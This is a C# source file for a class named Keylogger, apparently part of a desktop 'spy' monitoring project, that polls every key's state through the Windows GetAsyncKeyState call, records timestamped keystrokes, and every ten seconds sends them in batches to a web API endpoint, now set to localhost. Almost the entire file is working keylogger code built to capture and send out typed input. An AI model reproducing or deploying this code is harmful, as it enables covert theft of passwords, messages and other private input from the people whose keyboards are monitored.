using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Net.Http;
using System.Net.Http.Formatting;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using HIT.Common.Extensions;
using HIT.Web.ViewModels;

namespace HIT.Desktop.Spy
{
    public class Keylogger : IRunnable
    {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);

        private static readonly object syncLock = new object();

        private readonly string SessionId;
        private readonly Timer timer;
        private readonly ConcurrentQueue<string> KeysPressedQueue;

        private bool isRunning = true;
        
        public Keylogger(string sessionId)
        {
            this.SessionId = sessionId;
            this.KeysPressedQueue = new ConcurrentQueue<string>();

            var dueTime = 2000;
            var period = 10000;
            this.timer = new Timer(async (obj) => { await this.TimerEventHandler(); }, null, dueTime, period);
        }

        public Task Start()
        {
            while (this.isRunning)
            {
                for (Int32 i = 0; i < 255; i++)
                {
                    var keyState = GetAsyncKeyState(i);

                    if (keyState == 1 || keyState == -32767)
                    {
                        var key = (Keys)i;

                        if (key != Keys.LButton && key != Keys.RButton)
                        {
                            this.KeysPressedQueue.Enqueue($"[{DateTime.Now}] - {key}");
                        }
                    }
                }

                Thread.Sleep(10);
            }

            return null;
        }

        public async void Stop()
        {
            this.isRunning = false;
            // TODO await this.Send(this.KeysPressedQueue);
        }

        private IEnumerable<string> ExtractQueuedItemsFrom(ConcurrentQueue<string> queue)
        {
            var itemsToDequeueCount = queue.Count;
            var itemsDequeued = new List<string>(itemsToDequeueCount);

            var item = default(string);
            var canDequeueItem = queue.TryDequeue(out item);
            var shouldDequeueItem = itemsToDequeueCount > 0;

            while (shouldDequeueItem && canDequeueItem)
            {
                itemsDequeued.Add(item);
                itemsToDequeueCount--;
                canDequeueItem = queue.TryDequeue(out item);
                shouldDequeueItem = itemsToDequeueCount > 0;
            }

            return itemsDequeued;
        }

        private async Task TimerEventHandler()
        {
            if (this.KeysPressedQueue.IsNotNull() && this.KeysPressedQueue.Count.IsGreaterThan(0))
            {
                IEnumerable<string> keysToSend;

                /* We are using a lock here, because there is a chance that the TimerEventHandler() 
                 * will be invoked again before its previous execution is completed. 
                 * This comes from the fact that we are awaiting an API call to a distant server, 
                 * which might slow down the execution for multiple reasons like: 
                 * Low bandwidth or High workload.
                 * This will occur in a race condition because both of the methods will try to
                 * dequeue items from the queue concurrently, which is not a problem for the queue itself,
                 * but it is a problem for the lists that are be built - 
                 * they will contain chronologically messed up data. */
                lock (syncLock)
                {
                    keysToSend = this.ExtractQueuedItemsFrom(this.KeysPressedQueue);
                }

                try
                {
                    var baseAddress = "http://localhost:62164/";
                    var requestUri = "api/Sessions/PostKeysPressed";
                    var model = new KeysPressedViewModel
                    {
                        SessionId = this.SessionId,
                        KeysPressed = keysToSend
                    };

                    await this.SendTo(baseAddress, requestUri, model);
                }
                catch (Exception exc)
                {
                    // TODO: Log the exception cause
                }
            }
        }

        private async Task SendTo<T>(string baseAddress, string requestUri, T data)
        {
            // TODO: Introduce an HttpClientProvider to detach from the HttpClient type
            // and make the code more testable
            using (var client = new HttpClient())
            {
                // Set the Base address for all request uri's
                client.BaseAddress = new Uri(baseAddress);

                // Set the Accept header to ContentType BSON
                client.DefaultRequestHeaders.Accept.Clear();
                client.DefaultRequestHeaders.Accept.Add(
                    new MediaTypeWithQualityHeaderValue("application/bson"));

                // POST using a BSON formatter
                var bsonFormatter = new BsonMediaTypeFormatter();
                var result = await client.PostAsync(requestUri, data, bsonFormatter);

                result.EnsureSuccessStatusCode();
            }
        }
    }
}
